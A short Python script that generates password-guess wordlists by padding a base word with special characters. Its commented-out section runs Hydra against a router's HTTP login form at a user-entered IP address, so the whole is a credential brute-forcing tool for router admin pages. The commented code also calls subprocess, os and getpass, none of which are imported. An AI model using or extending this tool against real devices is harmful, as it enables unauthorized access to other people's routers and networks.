def load_lists():
    list = ['!','@','-','_','=','#','$','%','^','&','*','(',')','.','"',"'","|","{","}",",","<",">","~","`",""]
    list_2 = []
    list_3 = []
    list_4 = []
    for i in range(len(list)):
        list_2.append(list[i]*2)
        list_3.append(list[i]*3)
        list_4.append(list[i]*4)
    return list,list_2,list_3,list_4
def generate_password(partofpassword,filename):
    l1,l2,l3,l4 = load_lists()
    list_to_file = []
    lists = [l1,l2,l3,l4]
    for var in lists:
        for char in range(len(var)):
            first = var[char] + partofpassword + var[char]
            second = var[char] + partofpassword
            third = partofpassword + var[char]
            list_to_file.append(first)
            list_to_file.append(second)
            list_to_file.append(third)
    with open(filename,"w") as f:
        for item in list_to_file:
            f.write(item + '\n')
    choice = input("Wanna view them? Type 'yes' or press Enter to skip: ")
    if choice.lower() == "yes":
        with open(filename, 'r') as f:
            lines = [line.strip() for line in f.readlines()]
            print(lines)

    print("Bye!")
        
    

# def make_file(filename):
#     with open(filename,'w') as f:
#         username = input("Enter username of the router login page:")
#         f.write(username)

    
#     return filename 



# def run_hydra(target_ip):
#     username_file = make_file('username.txt')
#     command_str = f"hydra -L {username_file} -P generated_password.txt -t 1 {target_ip} http-post-form \"/login:user=^USER^&pass=^PASS^:F=Login_failed\""
    
#     # Run the command using subprocess with shell=True to handle special characters
#     subprocess.run(command_str, shell=True)


# def main():
#     # if __name__=="__main__":
#         target_ip = input("Enter the AP's IP-address: (e.g x.x.x.x): ")
#         choice = input("Do you want to generate password: 1/0/-1 to clear the passwd_file e.g. 0")
#         if choice == "1":    
#             base_word = getpass.getpass("Enter part of the password to add random specials:")
#             filename = "generated_password.txt"
#             generate_password(base_word,filename)
#             run_hydra(target_ip)
#         elif choice == "0":
#             print("using already generated password!")
#             run_hydra(target_ip)
        
#         elif choice == "-1":
#             to_find = "generated_password.txt"
#             files = os.listdir()
            
#             if to_find in files:
#                 command_str = f"truncate -s 0 {to_find}"
#                 subprocess.run(command_str,shell=True)
#                 print("the file is empty now!")
#             else:
#                 print("the file not found or removed")
# if __name__ == "__main__":
#     main()


    
